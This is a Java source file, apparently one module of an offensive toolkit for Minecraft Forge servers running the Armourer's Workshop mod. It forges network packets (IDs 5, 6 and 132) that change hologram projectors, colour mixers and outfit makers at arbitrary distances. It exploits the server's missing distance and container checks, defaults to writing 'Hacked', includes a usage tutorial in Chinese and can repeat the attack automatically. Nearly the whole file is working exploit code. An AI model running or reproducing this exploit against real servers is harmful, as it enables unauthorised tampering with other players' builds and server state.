package com.redblue.red.modules.armourersworkshop;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * AW03: Remote BlockEntity manipulation (no distance/container check).
 *
 * Targets:
 * - UpdateHologramProjectorPacket (ID 5): zero checks, just instanceof then apply
 * - UpdateColorMixerPacket (ID 6): same pattern
 * - UpdateOutfitMakerPacket (ID 132): ITEM_NAME/ITEM_FLAVOUR have no container check
 *
 * HologramProjector field ordinals:
 *   0=POWER_MODE(int), 1=IS_GLOWING(bool), 2=SHOWS_ROTATION_POINT(bool),
 *   3=OFFSET(3xfloat), 4=ANGLE(3xfloat), 5=ROTATION_OFFSET(3xfloat),
 *   6=ROTATION_SPEED(3xfloat)
 *
 * ColorMixer field ordinals:
 *   0=COLOR(int rawValue)
 *
 * OutfitMaker field ordinals:
 *   0=ITEM_NAME(string), 1=ITEM_FLAVOUR(string)
 */
public class AW03_RemoteBlockEntity implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("armourers_workshop", "aw-channel");

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("target_type", "方块类型",
                "HOLOGRAM", "HOLOGRAM", "COLOR_MIXER", "OUTFIT_MAKER"),
        ConfigParam.ofBlock("target_block", "目标方块坐标"),
        // Hologram params
        ConfigParam.ofEnum("holo_field", "全息投影字段",
                "OFFSET", "OFFSET", "ANGLE", "ROTATION_SPEED", "IS_GLOWING", "POWER_MODE")
                .visibleWhen("target_type", "HOLOGRAM"),
        ConfigParam.ofFloat("vec_x", "X", 0f, -1000f, 1000f)
                .visibleWhen("target_type", "HOLOGRAM"),
        ConfigParam.ofFloat("vec_y", "Y", 0f, -1000f, 1000f)
                .visibleWhen("target_type", "HOLOGRAM"),
        ConfigParam.ofFloat("vec_z", "Z", 0f, -1000f, 1000f)
                .visibleWhen("target_type", "HOLOGRAM"),
        // ColorMixer params
        ConfigParam.ofInt("color_raw", "颜色 (原始整数)", 0xFF0000, Integer.MIN_VALUE, Integer.MAX_VALUE)
                .visibleWhen("target_type", "COLOR_MIXER"),
        // OutfitMaker params
        ConfigParam.ofEnum("outfit_field", "服装字段",
                "ITEM_NAME", "ITEM_NAME", "ITEM_FLAVOUR")
                .visibleWhen("target_type", "OUTFIT_MAKER"),
        ConfigParam.ofString("outfit_text", "文本值", "Hacked")
                .visibleWhen("target_type", "OUTFIT_MAKER"),
        ConfigParam.ofInt("interval", "自动间隔 (tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "aw03_remote_block_entity"; }
    @Override public String name() { return "远程方块实体"; }
    @Override public String description() {
        return "绕过距离限制操作远程方块实体";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 选择方块类型: HOLOGRAM(全息投影)、COLOR_MIXER(调色器)、OUTFIT_MAKER(服装制作台)\n"
            + "2. 设置目标方块坐标（瞄准或手动输入）\n"
            + "3. 配置对应字段和数值\n"
            + "4. 执行以修改远程方块实体\n\n"
            + "[参数说明]\n"
            + "全息投影字段: OFFSET(偏移)、ANGLE(角度)、ROTATION_SPEED(旋转速度)等\n"
            + "颜色: 调色器的原始颜色整数值\n"
            + "服装字段: ITEM_NAME(物品名称)、ITEM_FLAVOUR(物品描述)\n"
            + "自动间隔: 自动执行的tick间隔\n\n"
            + "[注意事项]\n"
            + "服务端仅检查方块实体类型，无距离或GUI校验。";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("armourers_workshop");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) { doAttack(mc); }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doAttack(mc);
    }

    private void doAttack(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        long blockLong = getParam("target_block").map(ConfigParam::getLong).orElse(0L);
        if (blockLong == 0) return;
        BlockPos pos = BlockPos.of(blockLong);

        String type = getParam("target_type").map(ConfigParam::getString).orElse("HOLOGRAM");
        switch (type) {
            case "HOLOGRAM" -> sendHologram(pos);
            case "COLOR_MIXER" -> sendColorMixer(pos);
            case "OUTFIT_MAKER" -> sendOutfitMaker(pos);
        }
    }

    private void sendHologram(BlockPos pos) {
        String field = getParam("holo_field").map(ConfigParam::getString).orElse("OFFSET");
        float x = getParam("vec_x").map(ConfigParam::getFloat).orElse(0f);
        float y = getParam("vec_y").map(ConfigParam::getFloat).orElse(0f);
        float z = getParam("vec_z").map(ConfigParam::getFloat).orElse(0f);

        int fieldOrdinal;
        boolean isVector = true;
        switch (field) {
            case "POWER_MODE" -> { fieldOrdinal = 0; isVector = false; }
            case "IS_GLOWING" -> { fieldOrdinal = 1; isVector = false; }
            case "OFFSET" -> fieldOrdinal = 3;
            case "ANGLE" -> fieldOrdinal = 4;
            case "ROTATION_SPEED" -> fieldOrdinal = 6;
            default -> fieldOrdinal = 3;
        }

        final int fo = fieldOrdinal;
        final boolean iv = isVector;
        PacketForge.send(CHANNEL, buf -> {
            buf.writeInt(5); // packetId
            buf.writeBlockPos(pos);
            buf.writeVarInt(fo);
            if (iv) {
                buf.writeFloat(x);
                buf.writeFloat(y);
                buf.writeFloat(z);
            } else if (fo == 0) {
                buf.writeInt((int) x); // POWER_MODE = int
            } else {
                buf.writeBoolean(x != 0); // IS_GLOWING = bool
            }
        });
    }

    private void sendColorMixer(BlockPos pos) {
        int color = getParam("color_raw").map(ConfigParam::getInt).orElse(0xFF0000);
        PacketForge.send(CHANNEL, buf -> {
            buf.writeInt(6); // packetId
            buf.writeBlockPos(pos);
            buf.writeVarInt(0); // field ordinal 0 = COLOR
            buf.writeInt(color); // SkinPaintColor raw value
        });
    }

    private void sendOutfitMaker(BlockPos pos) {
        String field = getParam("outfit_field").map(ConfigParam::getString).orElse("ITEM_NAME");
        String text = getParam("outfit_text").map(ConfigParam::getString).orElse("Hacked");
        int ordinal = "ITEM_FLAVOUR".equals(field) ? 1 : 0;

        PacketForge.send(CHANNEL, buf -> {
            buf.writeInt(132); // packetId
            buf.writeBlockPos(pos);
            buf.writeVarInt(ordinal);
            // STRING serializer uses EntityDataSerializers.STRING
            // which is FriendlyByteBuf.writeUtf
            buf.writeUtf(text);
        });
    }
}
